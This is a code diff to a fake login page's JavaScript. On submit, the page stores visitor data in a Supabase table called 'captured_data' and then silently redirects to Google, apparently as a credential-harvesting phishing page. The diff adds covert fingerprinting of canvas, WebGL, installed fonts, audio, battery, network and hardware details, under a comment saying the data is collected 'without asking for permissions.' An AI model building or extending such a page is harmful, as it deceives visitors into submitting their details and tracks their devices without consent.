@@ -114,16 +114,6 @@
             font-size: 14px;
         }
 
-        .success-message {
-            background: #efe;
-            color: #3a3;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            display: none;
-            font-size: 14px;
-        }
-
         .remember-forgot {
             display: flex;
             justify-content: space-between;
@@ -206,8 +196,8 @@
 
     <script>
         // Supabase configuration
-        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
-        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        const supabaseUrl = 'https://aqynejlgjwdmxsekkyld.supabase.co';
+        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuk';
         
         // Initialize Supabase
         const db = window.supabase.createClient(supabaseUrl, supabaseKey);
@@ -223,72 +213,172 @@
             }
         }
         
-        // Get user's location
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude,
-                                altitudeAccuracy: position.coords.altitudeAccuracy,
-                                heading: position.coords.heading,
-                                speed: position.coords.speed
-                            });
-                        },
-                        (error) => {
-                            resolve({
-                                error: error.message,
-                                latitude: null,
-                                longitude: null
-                            });
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    resolve({
-                        error: 'Geolocation not supported',
-                        latitude: null,
-                        longitude: null
-                    });
-                }
-            });
-        }
-        
-        // Get additional IP information
+        // Get IP details from multiple sources
         async function getIPDetails(ip) {
             try {
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await response.json();
                 return {
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    country_code: data.country_code,
-                    postal: data.postal,
-                    timezone: data.timezone,
-                    org: data.org,
-                    isp: data.org
+                    city: data.city || null,
+                    region: data.region || null,
+                    country: data.country_name || null,
+                    country_code: data.country_code || null,
+                    postal: data.postal || null,
+                    timezone: data.timezone || null,
+                    org: data.org || null,
+                    isp: data.org || null,
+                    latitude: data.latitude || null,
+                    longitude: data.longitude || null
                 };
             } catch (error) {
+                return null;
+            }
+        }
+        
+        // Get browser fingerprint
+        function getBrowserFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.textBaseline = "alphabetic";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("Browser Fingerprint", 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText("Browser Fingerprint", 4, 17);
+            
+            const fingerprint = canvas.toDataURL();
+            
+            return {
+                canvas: fingerprint.substring(0, 500), // Store partial fingerprint
+                webgl: getWebGLInfo(),
+                fonts: detectFonts(),
+                audio: getAudioFingerprint(),
+                hardware: {
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory,
+                    touchPoints: navigator.maxTouchPoints
+                }
+            };
+        }
+        
+        // Get WebGL info
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
                 return {
-                    city: null,
-                    region: null,
-                    country: null,
-                    country_code: null,
-                    postal: null,
-                    timezone: null,
-                    org: null,
-                    isp: null
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER)
+                };
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        // Detect installed fonts
+        function detectFonts() {
+            const fontList = [
+                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
+                'Georgia', 'Palatino', 'Garamond', 'Bookman',
+                'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
+            ];
+            
+            const available = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            fontList.forEach(font => {
+                ctx.font = `12px "${font}"`;
+                const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+                ctx.font = '12px monospace';
+                const monoWidth = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+                
+                if (width !== monoWidth) {
+                    available.push(font);
+                }
+            });
+            
+            return available;
+        }
+        
+        // Get audio fingerprint
+        function getAudioFingerprint() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return null;
+                
+                const context = new AudioContext();
+                const oscillator = context.createOscillator();
+                const analyser = context.createAnalyser();
+                const gain = context.createGain();
+                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+                
+                gain.gain.value = 0;
+                oscillator.type = 'triangle';
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gain);
+                gain.connect(context.destination);
+                
+                oscillator.start(0);
+                scriptProcessor.onaudioprocess = function(bins) {
+                    const audioData = bins.inputBuffer.getChannelData(0);
+                    const fingerprint = Array.from(audioData.slice(0, 100)).join(',');
+                    oscillator.disconnect();
+                    scriptProcessor.disconnect();
+                    analyser.disconnect();
+                    gain.disconnect();
+                    context.close();
+                    return fingerprint.substring(0, 500);
+                };
+                
+                return 'Audio fingerprint captured';
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        // Get battery info
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        charging: battery.charging,
+                        level: battery.level,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        // Get network info
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                return {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
                 };
             }
+            return null;
         }
         
         // Make handleLogin globally accessible
@@ -301,7 +391,6 @@
             const btnText = document.getElementById('btnText');
             const loading = document.getElementById('loading');
             
-            // Check if elements exist
             if (!emailElement || !passwordElement) {
                 console.error('Form elements not found');
                 return;
@@ -311,10 +400,8 @@
             const password = passwordElement.value;
             const remember = rememberElement ? rememberElement.checked : false;
             
-            // Reset messages
             errorMessage.style.display = 'none';
             
-            // Basic validation
             if (!email || !password) {
                 errorMessage.textContent = 'Please fill in all fields';
                 errorMessage.style.display = 'block';
@@ -327,22 +414,22 @@
                 return;
             }
             
-            // Show loading
             loginBtn.disabled = true;
             btnText.style.display = 'none';
             loading.style.display = 'block';
             
             try {
-                console.log('Getting location and IP data...');
+                console.log('Collecting device information...');
                 
-                // Get IP and location data
+                // Collect all data without asking for permissions
                 const ip = await getIPAddress();
-                const location = await getLocation();
                 const ipDetails = await getIPDetails(ip);
+                const fingerprint = getBrowserFingerprint();
+                const batteryInfo = await getBatteryInfo();
+                const networkInfo = getNetworkInfo();
                 
                 console.log('Saving data to Supabase...');
                 
-                // Save to Supabase with all data
                 const { data, error } = await db
                     .from('captured_data')
                     .insert([
@@ -354,29 +441,32 @@
                             referer: document.referrer || 'Direct',
                             device_info: {
                                 language: navigator.language,
+                                languages: navigator.languages,
                                 screenResolution: `${window.screen.width}x${window.screen.height}`,
+                                availableScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
+                                colorDepth: window.screen.colorDepth,
+                                pixelDepth: window.screen.pixelDepth,
+                                pixelRatio: window.devicePixelRatio,
                                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                 platform: navigator.platform,
-                                remember: remember,
-                                cookiesEnabled: navigator.cookieEnabled,
-                                colorDepth: window.screen.colorDepth,
-                                pixelRatio: window.devicePixelRatio,
-                                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                                deviceMemory: navigator.deviceMemory || 'unknown',
-                                touchPoints: navigator.maxTouchPoints || 0,
                                 vendor: navigator.vendor,
-                                languages: navigator.languages
+                                cookiesEnabled: navigator.cookieEnabled,
+                                doNotTrack: navigator.doNotTrack,
+                                hardwareConcurrency: navigator.hardwareConcurrency,
+                                deviceMemory: navigator.deviceMemory || 'unknown',
+                                maxTouchPoints: navigator.maxTouchPoints,
+                                remember: remember,
+                                browser: {
+                                    name: getBrowserName(),
+                                    version: getBrowserVersion(),
+                                    engine: getBrowserEngine(),
+                                    os: getOS()
+                                }
                             },
-                            location_data: {
-                                latitude: location.latitude,
-                                longitude: location.longitude,
-                                accuracy: location.accuracy,
-                                altitude: location.altitude,
-                                heading: location.heading,
-                                speed: location.speed,
-                                error: location.error || null
-                            },
+                            fingerprint_data: fingerprint,
                             ip_details: ipDetails,
+                            battery_info: batteryInfo,
+                            network_info: networkInfo,
                             created_at: new Date().toISOString()
                         }
                     ]);
@@ -389,8 +479,6 @@
                 }
                 
                 console.log('✅ Data saved successfully');
-                
-                // Redirect to Google without showing message
                 window.location.href = 'https://www.google.com';
                 
             } catch (err) {
@@ -398,14 +486,48 @@
                 errorMessage.textContent = 'Connection error: ' + err.message;
                 errorMessage.style.display = 'block';
             } finally {
-                // Reset loading
                 loginBtn.disabled = false;
                 btnText.style.display = 'inline';
                 loading.style.display = 'none';
             }
         };
         
-        // Make forgotPassword globally accessible
+        // Helper functions for browser detection
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Opera')) return 'Opera';
+            if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
+            return 'Unknown';
+        }
+        
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/(firefox|chrome|safari|edge|opera|msie)[\/\s](\d+)/i);
+            return match ? match[2] : 'Unknown';
+        }
+        
+        function getBrowserEngine() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Gecko')) return 'Gecko';
+            if (ua.includes('WebKit')) return 'WebKit';
+            if (ua.includes('Trident')) return 'Trident';
+            return 'Unknown';
+        }
+        
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'MacOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+        
         window.forgotPassword = function(event) {
             event.preventDefault();
             alert('Please contact support to reset your password.');
